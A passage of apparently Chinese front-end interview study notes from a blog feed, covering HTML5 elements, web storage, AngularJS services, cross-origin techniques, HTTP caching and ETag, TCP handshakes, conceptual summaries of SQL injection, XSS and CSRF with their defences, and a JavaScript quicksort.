）可选脚本内容（对于不支持 script 的浏览器显示此内容） ol - 排序表单 p - 段落 pre - 格式化文本 table - 表格 ul - 非排序列表可变元素可变元素为根据上下文语境决定该元素为块元素或者内联元素。 applet - java applet button - 按钮 del - 删除文本 iframe - inline frame ins - 插入的文本 map - 图片区块 (map) object - object对象 script - 客户端脚本 (3)空元素 ( 在 HTML[1] 元素中，没有内容的 HTML 元素被称为空元素 ) //换行 //分隔线 //文本框等 //图片 ==8. 请你描述一下 cookies，sessionStorage 和 localStorage 的区别?==sessionStorage 和 localStorage 是 HTML5 Web Storage API 提供的，可以方便的在 web 请求之间保存数据。有了本地数据，就可以避免数据在浏览器和服务器间不必要地来回传递。 sessionStorage、 localStorage 、 cookie 都是在浏览器端存储的数据，其中 sessionStorage 的概念很特别，引入了一个“浏览器窗口”的概念。 sessionStorage 是在同源的同窗口（或tab）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后， sessionStorage 即被销毁。同时“独立”打开的不同窗口，即使是同一页面， sessionStorage 对象也是不同的 cookies会发送到服务器端。其余两个不会。 Microsoft 指出 Internet Explorer 8 增加 cookie 限制为每个域名 50 个，但 IE7 似乎也允许每个域名 50 个 cookie 。 Firefox 每个域名 cookie 限制为 50 个。 Opera 每个域名 cookie 限制为 30 个。 Firefox 和 Safari 允许 cookie 多达 4097 个字节，包括名（ name ）、值（ value ）和等号。 Opera 许 cookie 多达 4096 个字节，包括：名（ name ）、值（ value ）和等号。 Internet Explorer 允许 cookie 多达 4095 个字节，包括：名（ name ）、值（ value ）和等号。区别： Cookie 每个域名存储量比较小（各浏览器不同，大致 4K ） 所有域名的存储量有限制（各浏览器不同，大致 4K ） 有个数限制（各浏览器不同） 会随请求发送到服务器 LocalStorage 永久存储 单个域名存储量比较大（推荐 5MB ，各浏览器不同） 总体数量无限制 SessionStorage 只在 Session 内有效 存储量更大（推荐没有限制，但是实际上各浏览器也不同） ==9. 说说你对HTML语义化的理解?==(1)什么是 HTML 语义化？ &lt;基本上都是围绕着几个主要的标签，像标题（ H1~H6 ）、列表（ li ）、强调（ strong em ）等等 &gt;根据内容的结构化（内容语义化），选择合适的标签（代码语义化）便于开发者阅读和写出更优雅的代码的同时让浏览器的爬虫和机器很好地解析。 (2)为什么要语义化？ 为了在没有CSS的情况下，页面也能呈现出很好地内容结构、代码结构 : 为了裸奔时好看；用户体验：例如title、 alt 用于解释名词或解释图片信息、 label 标签的活用；有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；便于团队开发和维护，语义化更具可读性，是下一步吧网页的重要动向，遵循W3C标准的团队都遵循这个标准，可以减少差异化。 (3) 语义化标签 SM:用来在页面中表示一套结构完整且独立的内容部分 SM:主题的附属信息 ( 用途很广，主要就是一个附属内容 ) ，如果 article 里面为一篇文章的话，那么文章的作者以及信息内容就是这篇文章的附属内容了 SM:媒体元素，比如一些视频，图片啊等等 SM:选项列表，与 input 元素配合使用，来定义 input 可能的值 SM:用于描述文档或者文档某个部分的细节 ~ 默认属性为 open~ ps:配合 summary 一起使用 ==10. link和@import的区别?==XML/HTML代码12345&lt;link rel='stylesheet' rev='stylesheet' href='CSS文件 ' type='text/css' media='all' /&gt;&lt;style type='text/css' media='screen'&gt;@import url('CSS文件 ');&lt;/style&gt; 两者都是外部引用CSS的方式，但是存在一定的区别： 区别1： link 是 XHTML 标签，除了加载 CSS 外，还可以定义 RSS 等其他事务； @import 属于 CSS 范畴，只能加载 CSS 。 区别2： link 引用 CSS 时，在页面载入时同时加载； @import 需要页面网页完全载入以后加载。 区别3： link 是 XHTML 标签，无兼容问题； @import 是在 CSS2.1 提出的，低版本的浏览器不支持。 区别4： ink 支持使用 Javascript 控制 DOM 去改变样式；而 @import 不支持。 ==11. 说说超链接target属性的取值和作用？==target这个属性指定所链接的页面在浏览器窗口中的打开方式。它的参数值主要有： _blank ：在新浏览器窗口中打开链接文件 _parent ：将链接的文件载入含有该链接框架的父框架集或父窗口中。如果含有该链接的框架不是嵌套的，则在浏览器全屏窗口中载入链接的文件，就象 _self 参数一。 _self ：在同一框架或窗口中打开所链接的文档。此参数为默认值，通常不用指定。但是我不太理解。 _top ：在当前的整个浏览器窗口中打开所链接的文档，因而会删除所有框架。 ==12. data-属性的作用是什么？==data-为前端开发者提供自定义的属性，这些属性集可以通过对象的 dataset 属性获取，不支持该属性的浏览器可以通过 getAttribute 方法获取。 需要注意的是：data-之后的以连字符分割的多个单词组成的属性，获取的时候使用驼峰风格。并不是所有的浏览器都支持 .dataset 属性，测试的浏览器中只有 Chrome 和 Opera 支持。即：当没有合适的属性和元素时，自定义的 data 属性是能够存储页面或 App 的私有的自定义数据。 ==13. 介绍一下你对浏览器内核的理解？==主要分成两部分：渲染引擎(layout engineer或 Rendering Engine) 和 JS 引擎。 渲染引擎：负责取得网页的内容（HTML、 XML 、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核。 JS引擎则：解析和执行 javascript 来实现网页的动态效果。最开始渲染引擎和JS引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。 ==14. iframe有那些缺点？== iframe会阻塞主页面的 Onload 事件； 搜索引擎的检索程序无法解读这种页面，不利于 SEO; iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。 使用iframe之前需要考虑这两个缺点。如果需要使用 iframe ，最好是通过 javascript动态给iframe添加 src 属性值，这样可以绕开以上两个问题。 ==15. 如何实现浏览器内多个标签页之间的通信?== WebSocket、 SharedWorker； 也可以调用localstorge、 cookies 等本地存储方式； localstorge另一个浏览上下文里被添加、修改或删除时，它都会触发一个事件， 我们通过监听事件，控制它的值来进行页面信息通信； 注意quirks： Safari 在无痕模式下设置 localstorge 值时会抛出 QuotaExceededError 的异常； ==16. HTML5标签的作用?(用途)== 使Web页面的内容更加有序和规范 使搜索引擎更加容易按照HTML5规则识别出有效的内容 使Web页面更接近于一种数据字段和表 ==17. 简述一下src与href的区别？==src用于替换当前元素， href 用于在当前文档和引用资源之间确立联系。 src是 source 的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求 src 资源时会将其指向的资源下载并应用到文档内，例如 js 脚本， img 图片和 frame 等元素。1&lt;script src ='js.js'&gt;&lt;/script&gt; 当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部。 href是 Hypertext Reference的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，如果我们在文档中添加1&lt;link href='common.css' rel='stylesheet'/&gt; 那么浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用 link 方式来加载 css ，而不是使用 @import 方式。 ==18. WebSocket与消息推送？==B/S架构的系统多使用HTTP协议，HTTP协议的特点： 1 无状态协议 2 用于通过 Internet 发送请求消息和响应消息 3 使用端口接收和发送消息，默认为80端口 底层通信还是使用Socket完成。HTTP协议决定了服务器与客户端之间的连接方式，无法直接实现消息推送,一些变相的解决办法： 双向通信与消息推送 轮询：客户端定时向服务器发送Ajax请求，服务器接到请求后马上返回响应信息并关闭连接。 优点：后端程序编写比较容易。 缺点：请求中有大半是无用，浪费带宽和服务器资源。 实例：适于小型应用。 长轮询：客户端向服务器发送Ajax请求，服务器接到请求后 hold 住连接，直到有新消息才返回响应信息并关闭连接，客户端处理完响应信息后再向服务器发送新的请求。 优点：在无消息的情况下不会频繁的请求，耗费资小。 缺点：服务器hold连接会消耗资源，返回数据顺序无保证，难于管理维护。 Comet 异步的 ashx ， 实例：WebQQ、 Hi 网页版、 Facebook IM 。 长连接：在页面里嵌入一个隐蔵iframe，将这个隐蔵 iframe 的 src 属性设为对一个长连接的请求或是采用xhr请求，服务器端就能源源不断地往客户端输入数据。 优点：消息即时到达，不发无用请求；管理起来也相对便。 缺点：服务器维护一个长连接会增加开销。 实例：Gmail聊天 Flash Socket：在页面中内嵌入一个使用了 Socket 类的 Flash 程序 JavaScript 通过调用此 Flash 程序提供的 Socket 接口与服务器端的 Socket 接口进行通信， JavaScript 在收到服务器端传送的信息后控制页面的显示。 优点：实现真正的即时通信，而不是伪即时。 缺点：客户端必须安装Flash插件；非 HTTP 协议，无法自动穿越防火墙。 实例：网络互动游戏。 Websocket:WebSocket是 HTML5 开始提供的一种浏览器与服务器间进行全双工通讯的网络技术。依靠这种技术可以实现客户端和服务器端的长连接，双向实时通信。特点: 事件驱动 异步 使用 ws 或者 wss 协议的客户端 socket 能够实现真正意义上的推送功能 缺点：少部分浏览器不支持，浏览器支持的程度与方式有区别。 ==19. 表单提交中Get和Post方式的区别？== get 是从服务器上获取数据， post 是向服务器传送数据。 get 服务器会检测数据有没有更新，若无更新则不会拉取新的数据，返回状态码304,；post请求是不管有没有更新都会再把数据传输一次，成功状态码为200。 get 是把参数数据队列加到提交表单的 ACTION 属性所指的 URL 中，值和表单内各个字段一一对应，在 URL 中可以看到。 post 是通过 HTTP post 机制，将表单内各个字段与其内容放置在 HTML HEADER 内一起传送到 ACTION 属性所指的 URL 地址 , 用户看不到这个过程。 对于 get 方式，服务器端用 Request.QueryString 获取变量的值，对于 post 方式，服务器端用 Request.Form 获取提交的数据。 get 传送的数据量较小，不能大于 2KB 。 post 传送的数据量较大，一般被默认为不受限制。但理论上， IIS4 中最大量为 80KB ， IIS5 中为 100KB 。 get 安全性非常低， post 安全性较高。 ==20. HTML5 有哪些新增的表单元素？== datalist datetime output keygen date month week time color number range email Url ==21. HTML5 废弃了哪些 HTML4 标签？==HTML5 废弃了一些过时的，不合理的HTML 标签： frame frameset noframe applet big center basefront ==22. HTML5 应用程序缓存和浏览器缓存有什么区别？==应用程序缓存是 HTML5 的重要特性之一，提供了离线使用的功能，让应用程序可以获取本地的网站内容，例如 HTML 、 CSS 、图片以及 JavaScript 。这个特性可以提高网站性能，它的实现借助于 manifest 文件，如下：1234&lt;!doctype html&gt;&lt;html manifest=”example.appcache”&gt;…..&lt;/html&gt; 与传统浏览器缓存相比，它不强制用户访问的网站内容被缓存。 ==23. HTML 5 Canvas vs. SVG==Canvas 和 SVG 都允许您在浏览器中创建图形，但是它们在根本上是不同的。 SVG SVG 是一种使用 XML 描述 2D 图形的语言。 SVG 基于 XML，这意味着 SVG DOM 中的每个元素都是可用的。您可以为某个元素附加 JavaScript 事件处理器。 在 SVG 中，每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。 Canvas Canvas 通过 JavaScript 来绘制 2D 图形。 Canvas 是逐像素进行渲染的。 在 canvas 中，一旦图形被绘制完成，它就不会继续得到浏览器的关注。如果其位置发生变化，那么整个场景也需要重新绘制，包括任何或许已被图形覆盖的对象。 Canvas 与 SVG 的比较 下表列出了 canvas 与 SVG 之间的一些不同之处。 Canvas 依赖分辨率 不支持事件处理器 弱的文本渲染能力 能够以 .png 或 .jpg 格式保存结果图像 最适合图像密集型的游戏，其中的许多对象会被频繁重绘 SVG 不依赖分辨率 支持事件处理器 最适合带有大型渲染区域的应用程序（比如谷歌地图） 复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快） 不适合游戏应用]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AngularJs简述]]></title>
    <url>%2F2018%2F05%2F06%2FAngularJs%2F</url>
    <content type="text"><![CDATA[==1. angular 的数据绑定采用什么机制？详述原理==脏检查机制。 双向数据绑定是 AngularJS 的核心机制之一。当 view 中有任何数据变化时，会更新到 model ，当 model 中数据有变化时，view 也会同步更新，显然，这需要一个监控。 原理就是，Angular 在 scope 模型上设置了一个 监听队列，用来监听数据变化并更新 view 。每次绑定一个东西到 view 上时 AngularJS 就会往 $watch 队列里插入一条 $watch，用来检测它监视的 model 里是否有变化的东西。当浏览器接收到可以被 angular context 处理的事件时，$digest 循环就会触发，遍历所有的 $watch，最后更新 dom。 举个栗子 1&lt;button ng-click=&quot;val=val+1&quot;&gt;increase 1&lt;/button&gt; click 时会产生一次更新的操作（至少触发两次 $digest 循环） 按下按钮浏览器接收到一个事件，进入到 angular context$digest 循环开始执行，查询每个 $watch 是否变化由于监视 $scope.val 的 $watch 报告了变化，因此强制再执行一次 $digest 循环新的 $digest 循环未检测到变化浏览器拿回控制器，更新 $scope.val 新值对应的 dom$digest 循环的上限是 10 次（超过 10次后抛出一个异常，防止无限循环）。 ==2. factory、service 和 provider 是什么关系？==factory 把 service 的方法和数据放在一个对象里，并返回这个对象 12345678app.factory(&apos;FooService&apos;, function()&#123; return &#123; target: &apos;factory&apos;, sayHello: function()&#123; return &apos;hello &apos; + this.target; &#125; &#125;&#125;); service 通过构造函数方式创建 service，返回一个实例化对象 1234567app.service(&apos;FooService&apos;, function()&#123; var self = this; this.target = &apos;service&apos;; this.sayHello = function()&#123; return &apos;hello &apos; + self.target; &#125;&#125;); provider 创建一个可通过 config 配置的 service，$get 中返回的，就是用 factory 创建 service 的内容 12345678910111213141516171819202122app.provider(&apos;FooService&apos;, function()&#123; this.configData = &apos;init data&apos;; this.setConfigData = function(data)&#123; if(data)&#123; this.configData = data; &#125; &#125; this.$get = function()&#123; var self = this; return &#123; target: &apos;provider&apos;, sayHello: function()&#123; return self.configData + &apos; hello &apos; + this.target; &#125; &#125; &#125;&#125;);// 此处注入的是 FooService 的 providerapp.config(function(FooServiceProvider)&#123; FooServiceProvider.setConfigData(&apos;config data&apos;);&#125;); 从底层实现上来看，service 调用了 factory，返回其实例；factory 调用了 provider，返回其 $get 中定义的内容。factory 和 service 功能类似，只不过 factory 是普通 function，可以返回任何东西（return 的都可以被访问，所以那些私有变量怎么写，你懂的）；service 是构造器，可以不返回（绑定到 this 的都可以被访问）；provider 是加强版 factory，返回一个可配置的 factory。]]></content>
      <categories>
        <category>AngularJs</category>
      </categories>
      <tags>
        <tag>AngularJs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试题]]></title>
    <url>%2F2018%2F05%2F06%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[==1. 如何解决跨域问题==JSONP：原理是：动态插入script标签，通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。 由于同源策略的限制，XmlHttpRequest只允许请求当前源（域名、协议、端口）的资源，为了实现跨域请求，可以通过script标签实现跨域请求，然后在服务端输出JSON数据并执行回调函数，从而解决了跨域的数据请求。 优点是兼容性好，简单易用，支持浏览器与服务器双向通信。缺点是只支持GET请求。 JSONP：json+padding（内填充），顾名思义，就是把JSON填充到一个盒子里 123456789101112131415&lt;script&gt; function createJs(sUrl)&#123; var oScript = document.createElement(&apos;script&apos;); oScript.type = &apos;text/javascript&apos;; oScript.src = sUrl; document.getElementsByTagName(&apos;head&apos;)[0].appendChild(oScript); &#125; createJs(&apos;jsonp.js&apos;); box(&#123; &apos;name&apos;: &apos;test&apos; &#125;); function box(json)&#123; alert(json.name); &#125;&lt;/script&gt; CORS服务器端对于CORS的支持，主要就是通过设置Access-Control-Allow-Origin来进行的。如果浏览器检测到相应的设置，就可以允许Ajax进行跨域的访问。 通过修改document.domain来跨子域将子域和主域的document.domain设为同一个主域.前提条件：这两个域名必须属于同一个基础域名!而且所用的协议，端口都要一致，否则无法利用document.domain进行跨域 主域相同的使用document.domain 使用window.name来进行跨域window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的 使用HTML5中新引进的window.postMessage方法来跨域传送数据还有flash、在服务器上设置代理页面等跨域方式。个人认为window.name的方法既不复杂，也能兼容到几乎所有浏览器，这真是极好的一种跨域方法。 ==2. XML和JSON的区别？==(1).数据体积方面。JSON相对于XML来讲，数据的体积小，传递的速度更快些。 (2).数据交互方面。JSON与JavaScript的交互更加方便，更容易解析处理，更好的数据交互。 (3).数据描述方面。JSON对数据的描述性比XML较差。 (4).传输速度方面。JSON的速度要远远快于XML。 ==3. 谈谈你对webpack的看法==WebPack 是一个模块打包工具，你可以使用WebPack管理你的模块依赖，并编绎输出模块们所需的静态文件。它能够很好地管理、打包Web开发中所用到的HTML、Javascript、CSS以及各种静态文件（图片、字体等），让开发过程更加高效。对于不同类型的资源，webpack有对应的模块加载器。webpack模块打包器会分析模块间的依赖关系，最后 生成了优化且合并后的静态资源。 webpack的两大特色： code splitting（可以自动完成） loader 可以处理各种类型的静态文件，并且支持串联操作 webpack 是以commonJS的形式来书写脚本滴，但对 AMD/CMD 的支持也很全面，方便旧项目进行代码迁移。 webpack具有requireJs和browserify的功能， 但仍有很多自己的新特性：对 CommonJS 、 AMD 、ES6的语法做了兼容 对js、css、图片等资源文件都支持打包 串联式模块加载器以及插件机制，让其具有更好的灵活性和扩展性，例如提供对CoffeeScript、ES6的支持 有独立的配置文件webpack.config.js 可以将代码切割成不同的chunk，实现按需加载，降低了初始化时间 支持 SourceUrls 和 SourceMaps，易于调试 具有强大的Plugin接口，大多是内部插件，使用起来比较灵活 webpack 使用异步 IO 并具有多级缓存。这使得 webpack 很快且在增量编译上更加快 ==4. 说说TCP传输的三次握手四次挥手策略==为了准确无误地把数据送达目标处，TCP协议采用了三次握手策略。用TCP协议把数据包送出去后，TCP不会对传送 后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了TCP的标志：SYN和ACK。 发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。 最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。若在握手过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包。 断开一个TCP连接则需要“四次挥手”： 第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可 以接受数据。 第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号）。 第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。 第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。 ==5. TCP和UDP的区别==TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个TCP连接必须要经过三次“对话”才能建立起来 UDP（User Data Protocol，用户数据报协议）是与TCP相对应的协议。它是面向非连接的协议，它不与对方建立连接，而是直接就把数据包发送过去！UDP适用于一次只传送少量数据、对可靠性要求不高的应用环境。 ==6. 说说你对作用域链的理解==作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到window对象即被终止，作用域链向下访问变量是不被允许的。 ==7. 创建ajax过程== 创建XMLHttpRequest对象,也就是创建一个异步调用对象. 创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息. 设置响应HTTP请求状态变化的函数. 发送HTTP请求. 获取异步调用返回的数据. 使用JavaScript和DOM实现局部刷新. ==8. 常见web安全及防护原理==sql注入原理就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 总的来说有以下几点： 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双”-“进行转换等。 永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。 不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。 XSS原理及防范Xss(cross-site scripting)攻击指的是攻击者往Web页面里插入恶意 html标签或者javascript代码。 比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取cookie中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点。 XSS防范方法首先代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”,”&gt;”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击。 首先，避免直接在cookie 中泄露用户隐私，例如email、密码等等。 其次，通过使cookie 和系统ip 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。 如果网站不需要再浏览器端对cookie 进行操作，可以在Set-Cookie 末尾加上HttpOnly 来防止javascript 代码直接获取cookie 。 尽量采用POST 而非GET 提交表单 XSS与CSRF有什么区别吗？XSS是获取信息，不需要提前知道其他用户页面的代码和数据包。CSRF是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。要完成一次CSRF攻击，受害者必须依次完成两个步骤： 登录受信任网站A，并在本地生成Cookie。 在不登出A的情况下，访问危险网站B。 CSRF的防御 服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。 通过验证码的方法 ==9. Web Worker 和webSocket==worker主线程: 通过 worker = new Worker( url ) 加载一个JS文件来创建一个worker，同时返回一个worker实例。 通过worker.postMessage( data ) 方法来向worker发送数据。 绑定worker.onmessage方法来接收worker发送过来的数据。 可以使用 worker.terminate() 来终止一个worker的执行。 WebSocketWebSocket是Web应用程序的传输协议，它提供了双向的，按序到达的数据流。他是一个HTML5协议，WebSocket的连接是持久的，他通过在客户端和服务器之间保持双工连接，服务器的更新可以被及时推送给客户端，而不需要客户端以一定时间间隔去轮询。 ==10. HTTP和HTTPS==HTTP协议通常承载于TCP协议之上，在HTTP和TCP之间添加一个安全协议层（SSL或TSL），这个时候，就成了我们常说的HTTPS。 默认HTTP的端口号为80，HTTPS的端口号为443。 ==11. 为什么HTTPS安全==因为网络请求需要中间有很多的服务器路由器的转发。中间的节点都可能篡改信息，而如果使用HTTPS，密钥在你和终点站才有。https之所以比http安全，是因为他利用ssl/tls协议传输。它包含证书，卸载，流量转发，负载均衡，页面适配，浏览器适配，refer传递等。保障了传输过程的安全性 ==12. 对前端模块化的认识== AMD 是 RequireJS 在推广过程中对模块定义的规范化产出。 CMD 是 SeaJS 在推广过程中对模块定义的规范化产出。 AMD 是提前执行，CMD 是延迟执行。 AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的。 CMD模块方式 123define(function(require, exports, module) &#123; // 模块代码&#125;); ==13. Javascript垃圾回收方法==标记清除（mark and sweep）这是JavaScript最常见的垃圾回收方式，当变量进入执行环境的时候，比如函数中声明一个变量，垃圾回收器将其标记为“进入环境”，当变量离开环境的时候（函数执行结束）将其标记为“离开环境”。 垃圾回收器会在运行的时候给存储在内存中的所有变量加上标记，然后去掉环境中的变量以及被环境中变量所引用的变量（闭包），在这些完成之后仍存在标记的就是要删除的变量了 引用计数(reference counting)在低版本IE中经常会出现内存泄露，很多时候就是因为其采用引用计数方式进行垃圾回收。引用计数的策略是跟踪记录每个值被使用的次数，当声明了一个 变量并将一个引用类型赋值给该变量的时候这个值的引用次数就加1，如果该变量的值变成了另外一个，则这个值得引用次数减1，当这个值的引用次数变为0的时 候，说明没有变量在使用，这个值没法被访问了，因此可以将其占用的空间回收，这样垃圾回收器会在运行的时候清理掉引用次数为0的值占用的空间。 在IE中虽然JavaScript对象通过标记清除的方式进行垃圾回收，但BOM与DOM对象却是通过引用计数回收垃圾的，也就是说只要涉及BOM及DOM就会出现循环引用问题。 ==14. 你觉得前端工程的价值体现在哪== 为简化用户使用提供技术支持（交互部分） 为多个浏览器兼容性提供支持 为提高用户浏览速度（浏览器性能）提供支持 为跨平台或者其他基于webkit或其他渲染引擎的应用提供支持 为展示数据提供支持（数据接口） ==15. 谈谈性能优化问题==缓存利用：缓存Ajax，使用CDN，使用外部js和css文件以便缓存，添加Expires头，服务端配置Etag，减少DNS查找等 请求数量：合并样式和脚本，使用css图片精灵，初始首屏之外的图片资源按需加载，静态资源延迟加载。 请求带宽：压缩文件，开启GZIP， 代码层面的优化： 避免使用css表达式，避免使用高级选择器，通配选择器。 用hash-table来优化查找 少用全局变量 用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能 用setTimeout来避免页面失去响应 缓存DOM节点查找的结果 避免使用CSS Expression 避免全局查询 避免使用with(with会创建自己的作用域，会增加作用域链长度) 多个变量声明合并 避免图片和iFrame等的空Src。空Src会重新加载当前页面，影响速度和效率 尽量避免写在HTML标签中写Style属性 ==16. 移动端性能优化== 尽量使用css3动画，开启硬件加速。 适当使用touch事件代替click事件。 避免使用css3渐变阴影效果。 可以用transform: translateZ(0)来开启硬件加速。 不滥用Float。Float在渲染时计算量比较大，尽量减少使用 不滥用Web字体。Web字体需要下载，解析，重绘当前页面，尽量减少使用。 合理使用requestAnimationFrame动画代替setTimeout CSS中的属性（CSS3 transitions、CSS3 3D transforms、Opacity、Canvas、WebGL、Video）会触发GPU渲染，请合理使用。过渡使用会引发手机过耗电增加 PC端的在移动端同样适用 ==17. 什么是Etag？==当发送一个服务器请求时，浏览器首先会进行缓存过期判断。浏览器根据缓存过期时间判断缓存文件是否过期。 情景一：若没有过期，则不向服务器发送请求，直接使用缓存中的结果，此时我们在浏览器控制台中可以看到 200 OK(from cache) ，此时的情况就是完全使用缓存，浏览器和服务器没有任何交互的。 情景二：若已过期，则向服务器发送请求，此时请求中会带上①中设置的文件修改时间，和Etag 然后，进行资源更新判断。服务器根据浏览器传过来的文件修改时间，判断自浏览器上一次请求之后，文件是不是没有被修改过；根据Etag，判断文件内容自上一次请求之后，有没有发生变化 情形一：若两种判断的结论都是文件没有被修改过，则服务器就不给浏览器发index.html的内容了，直接告诉它，文件没有被修改过，你用你那边的缓存吧—— 304 Not Modified，此时浏览器就会从本地缓存中获取index.html的内容。此时的情况叫协议缓存，浏览器和服务器之间有一次请求交互。 情形二：若修改时间和文件内容判断有任意一个没有通过，则服务器会受理此次请求，之后的操作同 只有get请求会被缓存，post请求不会 ==18. Expires和Cache-Control==Expires要求客户端和服务端的时钟严格同步。HTTP1.1引入Cache-Control来克服Expires头的限制。如果max-age和Expires同时出现，则max-age有更高的优先级。 12345Cache-Control: no-cache, private, max-age=0ETag: abcdeExpires: Thu, 15 Apr 2014 20:00:00 GMTPragma: privateLast-Modified: $now // RFC1123 format ==19. ETag应用:==Etag由服务器端生成，客户端通过If-Match或者说If-None-Match这个条件判断请求来验证资源是否修改。常见的是使用If-None-Match。请求一个文件的流程可能如下： ====第一次请求=== 客户端发起 HTTP GET 请求一个文件； 服务器处理请求，返回文件内容和一堆Header，当然包括Etag(例如”2e681a-6-5d044840”)(假设服务器支持Etag生成和已经开启了Etag).状态码200 ====第二次请求=== 客户端发起 HTTP GET 请求一个文件，注意这个时候客户端同时发送一个If-None-Match头，这个头的内容就是第一次请求时服务器返回的Etag：2e681a-6-5d0448402.服务器判断发送过来的Etag和计算出来的Etag匹配，因此If-None-Match为False，不返回200，返回304，客户端继续使用本地缓存；流程很简单，问题是，如果服务器又设置了Cache-Control:max-age和Expires呢，怎么办 答案是同时使用，也就是说在完全匹配If-Modified-Since和If-None-Match即检查完修改时间和Etag之后， 服务器才能返回304.(不要陷入到底使用谁的问题怪圈) 为什么使用Etag请求头? Etag 主要为了解决 Last-Modified 无法解决的一些问题。 ==20. 栈和队列的区别?==栈的插入和删除操作都是在一端进行的，而队列的操作却是在两端进行的。 队列先进先出，栈先进后出。 栈只允许在表尾一端进行插入和删除，而队列只允许在表尾一端进行插入，在表头一端进行删除 ==21. 栈和堆的区别？==栈区（stack）— 由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。 堆区（heap） — 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收。 堆（数据结构）：堆可以被看成是一棵树，如：堆排序； 栈（数据结构）：一种先进后出的数据结构。 ==22. 快速 排序的思想并实现一个快排？==“快速排序”的思想很简单，整个排序过程只需要三步： （1）在数据集之中，找一个基准点 （2）建立两个数组，分别存储左边和右边的数组 （3）利用递归进行下次比较 123456789101112131415161718192021&lt;script type=&quot;text/javascript&quot;&gt; function quickSort(arr)&#123; if(arr.length&lt;=1)&#123; return arr;//如果数组只有一个数，就直接返回； &#125; var num = Math.floor(arr.length/2);//找到中间数的索引值，如果是浮点数，则向下取整 var numValue = arr.splice(num,1);//找到中间数的值 var left = []; var right = []; for(var i=0;i&lt;arr.length;i++)&#123; if(arr[i]&lt;numValue)&#123; left.push(arr[i]);//基准点的左边的数传到左边数组 &#125; else&#123; right.push(arr[i]);//基准点的右边的数传到右边数组 &#125; &#125; return quickSort(left).concat([numValue],quickSort(right));//递归不断重复比较 &#125; alert(quickSort([32,45,37,16,2,87]));//弹出“2,16,32,37,45,87”&lt;/script&gt; ==23. 